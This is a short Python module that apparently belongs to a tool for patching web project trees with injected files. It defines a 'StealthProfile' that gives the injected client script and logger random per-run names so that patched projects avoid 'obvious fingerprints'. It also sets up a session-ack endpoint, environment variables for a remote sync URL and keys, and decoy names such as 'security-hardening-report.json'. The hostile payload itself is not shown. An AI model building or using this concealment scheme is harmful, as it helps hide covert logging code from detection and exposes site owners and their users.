"""Release naming — per-run random IDs so patched trees don't share obvious fingerprints."""
from __future__ import annotations

import secrets
from dataclasses import dataclass


@dataclass(frozen=True)
class StealthProfile:
    sync_id: str
    session_ack: str = "/api/_runtime/session-ack"
    env_url: str = "RUNTIME_SYNC_URL"
    env_key: str = "RUNTIME_SYNC_KEY"
    env_hmac: str = "RUNTIME_HMAC_KEY"
    report_name: str = "security-hardening-report.json"
    integrity_name: str = ".runtime-check.json"

    @property
    def client_public(self) -> str:
        return f"_sc{self.sync_id}.js"

    @property
    def logger_file(self) -> str:
        return f"_rs{self.sync_id}.js"

    @property
    def badge_component(self) -> str:
        return "SiteBadge.jsx"


def new_profile() -> StealthProfile:
    return StealthProfile(sync_id=secrets.token_hex(3))


def prepare_session_client(profile: StealthProfile, source: str) -> str:
    return source.replace("__SESSION_ACK__", profile.session_ack)


def prepare_session_ack(profile: StealthProfile, logger_require: str, source: str) -> str:
    return source.replace("__LOGGER_REQUIRE__", logger_require)
